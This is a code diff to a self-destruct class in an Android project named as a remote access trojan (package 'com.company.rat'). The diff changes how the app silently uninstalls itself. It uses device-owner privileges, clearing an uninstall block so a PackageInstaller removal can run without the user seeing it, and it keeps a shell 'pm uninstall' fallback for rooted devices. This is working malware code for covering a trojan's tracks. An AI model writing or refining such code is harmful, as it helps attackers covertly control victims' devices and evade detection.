@@ -1,5 +1,6 @@
 package com.company.rat;
 
+import android.app.PendingIntent;
 import android.app.admin.DevicePolicyManager;
 import android.content.*;
 import android.content.pm.PackageInstaller;
@@ -134,13 +135,11 @@ public class SelfDestruct {
             DevicePolicyManager dpm = (DevicePolicyManager) ctx.getSystemService(Context.DEVICE_POLICY_SERVICE);
             if (dpm == null || !dpm.isDeviceOwnerApp(pkg)) return false;
             ComponentName admin = new ComponentName(ctx, DeviceAdminReceiver.class);
-            // Schedule own uninstall via device owner privilege
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
-                dpm.uninstallPackage(admin, pkg);
-                return true;
-            }
+            // Ensure uninstall is not blocked by device policy, then fall through
+            // to PackageInstaller which is silent when caller is device owner
+            dpm.setUninstallBlocked(admin, pkg, false);
         } catch (Exception e) {
-            Log.w(TAG, "device owner uninstall: " + e.getMessage());
+            Log.w(TAG, "device owner uninstall setup: " + e.getMessage());
         }
         return false;
     }
@@ -148,7 +147,7 @@ public class SelfDestruct {
     private static boolean tryShellUninstall(String pkg) {
         try {
             // Works if ADB is active or device is rooted
-            Process p = Runtime.getRuntime().exec(new String[]{"pm", "uninstall", "-k", "--user", "0", pkg});
+            java.lang.Process p = Runtime.getRuntime().exec(new String[]{"pm", "uninstall", "-k", "--user", "0", pkg});
             p.waitFor();
             return p.exitValue() == 0;
         } catch (Exception e) {
